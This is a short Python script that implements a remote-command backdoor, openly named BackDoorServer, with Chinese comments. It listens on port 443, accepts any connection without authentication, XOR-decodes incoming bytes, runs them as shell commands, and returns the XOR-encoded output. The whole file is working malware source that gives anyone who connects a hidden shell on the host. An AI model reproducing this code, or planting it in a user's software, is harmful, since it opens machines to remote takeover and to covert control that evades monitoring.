#!/usr/bin/python
import socket
import subprocess
import select
import sys
 
class BackDoorServer(object):
    def __init__(self, port):
        self.port = port
        self.srvsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srvsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srvsock.bind(("", port))
        self.srvsock.listen(100)
        self.descriptors = [self.srvsock]
        self.sockInfoList = []
        print ('Listening on port %s' % port)
 
    def run(self):
        while True:
            # 等待一个可读的socket事件
            try:
                (sread, swrite, sexc) = select.select(self.descriptors, [], [])
                for sock in sread:
                    # Rreceived a connect to the server (listening) socket
                    if sock == self.srvsock:
                        self.accept_new_connection()
                    else:
                        data = sock.recv(1024)
                        if len(data) == 0:
                            self.descriptors.remove(sock)
                            for s in self.sockInfoList:
                                if sock == s[0]:
                                    print( 'Info: client %s:%s had closed!' % (s[1], s[2]))
                                    self.sockInfoList.remove(s)
                        en_data = bytearray(data)
                        for i in range(len(en_data)):
                            en_data[i] ^= 0x41
                        # 把数据作为指令执行
                        comm = subprocess.Popen(str(en_data), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                        comm.wait()
                        STDOUT, STDERR = comm.communicate()
                        if STDERR != "":
                            print (STDERR)
                        # Encode the output and send to RHOST
                        if STDOUT == "":
                            STDOUT = STDERR
                        en_STDOUT= bytearray(STDOUT)
                        for i in range(len(en_STDOUT)):
                            en_STDOUT[i] ^= 0x41
                        sock.send(str(len(en_STDOUT)))
                        if len(en_STDOUT) > 0:
                            sock.send(en_STDOUT)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print (e)
 
    def accept_new_connection(self):
        newsock, (remhost, remport) = self.srvsock.accept()
        print ('received a new connection from %s:%s' % (remhost, remport))
        self.descriptors.append(newsock)
        self.sockInfoList.append([newsock, remhost, remport])
 
if __name__ == '__main__':
    myServer = BackDoorServer(443).run()